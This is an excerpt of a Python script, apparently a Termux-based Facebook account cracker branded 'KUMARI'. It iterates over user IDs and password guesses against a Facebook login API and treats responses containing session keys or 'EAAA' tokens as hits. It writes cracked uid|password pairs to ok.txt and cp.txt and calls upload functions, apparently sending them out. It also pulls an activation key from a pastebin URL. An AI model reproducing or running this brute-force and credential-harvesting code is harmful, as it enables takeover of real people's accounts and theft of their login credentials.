...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://pastebin.com/raw/6y9YEQJJ"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/KUMARI.HUN.YAWR")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN🧞‍♀️ MESSENGER🔰🥰https://m.me/KUMARI.HUN.YAWR")
	subprocess.check_output(["am", "start", "https://m.me/KUMARI.HUN.YAWR"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://pastebin.com/raw/6y9YEQJJ').text
			if basesplit in plr:
				key = basesplit
...
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mWARNING  : KUMARIPASS KUMARI IRFAN
\033[1;90m══════════════════════════════════════════════════
    """)
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [KUMARI] : %s/%s -> \033[0;92m [ KUMARI-OK:%s ]- \033[0;91m[KUMARI-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[KUMARI-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [KUMARI-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[KUMARI-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [KUMARI-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
